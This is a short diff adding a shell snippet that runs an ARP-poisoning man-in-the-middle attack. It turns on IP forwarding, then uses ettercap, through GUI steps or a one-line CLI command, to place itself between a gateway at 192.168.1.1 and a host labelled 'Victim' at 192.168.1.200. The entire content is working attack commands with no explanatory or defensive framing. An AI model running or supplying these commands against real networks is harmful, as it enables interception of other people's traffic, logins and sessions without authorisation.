@@ -1,0 +1,9 @@
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Ettercap GUI: ettercap -G
+# Hosts → Scan for hosts → Targets 1: 192.168.1.1 (GW)
+# Targets 2: 192.168.1.200 (Victim) → MITM → ARP Poisoning
+
+# Or CLI:
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.200//
